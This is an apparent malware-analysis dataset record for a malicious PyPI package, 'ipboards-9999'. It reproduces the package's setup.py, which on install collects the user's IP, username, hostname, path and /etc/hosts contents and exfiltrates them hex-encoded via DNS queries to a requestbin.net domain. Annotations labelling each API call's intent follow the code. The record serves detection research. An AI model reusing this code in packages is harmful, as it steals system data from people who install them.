{
  "metadata": {
    "package_name": "ipboards-9999",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/tool_detect/false_negative/llm_analysis/ipboards-9999.0.2.json",
    "dataset_type": "malware_fn"
  },
  "code_files": [
    {
      "pyfile": "setup.py",
      "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/ipboards-9999.0.2/ipboards-9999.0.2/setup.py",
      "code_snippets": [
        {
          "snippet": "import dns.resolver\nimport getpass\nimport requests\nimport uuid\nfrom binascii import hexlify\nimport socket\nimport os\nimport time\n\ndnss = \".b0a0374cd1cb4305002e.d.requestbin.net\"\npackagename = \"ipboard\"\nuuidOne = str(uuid.uuid1())[0:8]\ndnss = '.' + uuidOne + dnss\nip = requests.get('http://ip.42.pl/raw').text\n\n#username,hostname,external_IP,time,path,package_name\nf = open(\"/etc/hosts\", \"r\")\nhostFile = f.read()\nusername = getpass.getuser()\nhostname = socket.gethostname()\nnow = int(time.time())\npath = os.path.dirname(os.path.abspath(__file__))\npayload = ip + ';' + username + ';' + hostname + ';' + str(now) + ';' + path + ';' + packagename + ';' + hostFile\ntry:\n    payload = hexlify(bytes(payload, encoding='utf8'))\nexcept:\n    payload = hexlify(bytes(payload))\n\nchunks = [payload[i:i+50] for i in range(0, len(payload), 50)]\n\nfor pd in chunks:\n    dns.resolver.query(pd.decode(\"utf-8\") + dnss, 'A')",
          "triple_sequences": [
            {
              "action_api": "uuid.uuid1()",
              "action_description": "Generate random number",
              "action_id": "generate_random_number",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Generate random number",
              "intention_id": "generate_random_number"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Opens URL with GET parameters",
              "action_id": "open_url_get",
              "object": "http://ip.42.pl/raw",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Extract public IP address",
              "intention_id": "extract_public_ip_address"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "/etc/hosts",
              "object_description": "System hosts configuration",
              "object_id": "system_hosts_config",
              "intention_description": "Access hosts configuration",
              "intention_id": "access_hosts_configuration"
            },
            {
              "action_api": "file.read()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "",
              "object_description": "System hosts configuration",
              "object_id": "system_hosts_config",
              "intention_description": "Access hosts configuration",
              "intention_id": "access_hosts_configuration"
            },
            {
              "action_api": "getpass.getuser()",
              "action_description": "Retrieves current user login name",
              "action_id": "get_username",
              "object": "",
              "object_description": "Current username",
              "object_id": "current_username",
              "intention_description": "Access current username",
              "intention_id": "access_current_username"
            },
            {
              "action_api": "socket.gethostname()",
              "action_description": "Retrieves current host name",
              "action_id": "get_hostname",
              "object": "",
              "object_description": "Current hostname",
              "object_id": "current_hostname",
              "intention_description": "Access computer name",
              "intention_id": "access_computer_name"
            },
            {
              "action_api": "time.time()",
              "action_description": "Returns current time",
              "action_id": "get_current_time",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get datetime epoch",
              "intention_id": "get_datetime_epoch"
            },
            {
              "action_api": "os.path.abspath()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "__file__",
              "object_description": "Script file path",
              "object_id": "script_file_path",
              "intention_description": "Get script file path",
              "intention_id": "get_script_file_path"
            },
            {
              "action_api": "os.path.dirname()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "os.path.abspath(__file__)",
              "object_description": "Script file path",
              "object_id": "script_file_path",
              "intention_description": "Prepare directory path",
              "intention_id": "prepare_directory_path"
            },
            {
              "action_api": "bytes()",
              "action_description": "Encodes string to bytes using default encoding",
              "action_id": "encode_string_to_bytes",
              "object": "payload, encoding='utf8'",
              "object_description": "String containing environment data",
              "object_id": "string_environment_data",
              "intention_description": "Encode string to bytes",
              "intention_id": "encode_string_to_bytes"
            },
            {
              "action_api": "binascii.hexlify()",
              "action_description": "Converts bytes to hexadecimal string",
              "action_id": "convert_bytes_to_hex",
              "object": "bytes(payload, encoding='utf8')",
              "object_description": "String containing environment data",
              "object_id": "string_environment_data",
              "intention_description": "Serialize data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "bytes()",
              "action_description": "Encodes string to bytes using default encoding",
              "action_id": "encode_string_to_bytes",
              "object": "payload",
              "object_description": "String containing environment data",
              "object_id": "string_environment_data",
              "intention_description": "Encode string to bytes",
              "intention_id": "encode_string_to_bytes"
            },
            {
              "action_api": "binascii.hexlify()",
              "action_description": "Converts bytes to hexadecimal string",
              "action_id": "convert_bytes_to_hex",
              "object": "bytes(payload)",
              "object_description": "String containing environment data",
              "object_id": "string_environment_data",
              "intention_description": "Serialize data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "payload[i:i+50]",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "payload[i:i+50]",
              "object_description": "",
              "object_id": "",
              "intention_description": "Prepare data processing",
              "intention_id": "prepare_data_processing"
            },
            {
              "action_api": "pd.decode()",
              "action_description": "Decodes bytes using default codec",
              "action_id": "decode_bytes_default",
              "object": "pd",
              "object_description": "",
              "object_id": "",
              "intention_description": "Decode bytes to string",
              "intention_id": "decode_bytes_to_string"
            },
            {
              "action_api": "dns.resolver.query()",
              "action_description": "Sends DNS request",
              "action_id": "send_dns_request",
              "object": "pd.decode(\"utf-8\") + dnss, 'A'",
              "object_description": "Request object for external domain",
              "object_id": "request_external_domain",
              "intention_description": "Transmit encoded data via DNS",
              "intention_id": "transmit_data_dns"
            }
          ]
        }
      ]
    }
  ]
}